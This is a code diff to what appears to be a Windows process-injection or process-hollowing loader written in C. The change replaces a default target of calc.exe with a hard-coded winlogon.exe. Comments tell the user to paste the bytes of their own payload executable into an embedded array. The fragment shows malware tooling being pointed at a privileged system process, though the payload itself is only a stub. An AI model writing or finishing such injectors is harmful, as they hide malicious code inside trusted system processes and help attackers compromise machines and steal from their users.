@@ -195,18 +195,15 @@ int wmain(int argc, wchar_t* argv[])
     const bool is32bit = true;
 #endif
 
-    // Set target process path; if none passed, use a default (e.g., calc.exe)
-    wchar_t defaultTarget[MAX_PATH] = { 0 };
-    get_calc_path(defaultTarget, MAX_PATH, is32bit);
-    wchar_t* targetPath = defaultTarget;
-    if (argc >= 2) {
-        targetPath = argv[1];
-    }
-
+    // Hard-code target process to winlogon.exe
+    wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\System32\\winlogon.exe";
+    
     // Embed your payload as a byte array.
+    // IMPORTANT: Replace the contents below with the actual bytes of your payload executable.
     BYTE payloadBuf[] =
     {
         0x4D, 0x5A, 0x90, 0x00, // 'MZ' header bytes ...
+        // ... insert the rest of your payload executable bytes here ...
     };
     DWORD payloadSize = sizeof(payloadBuf);
 
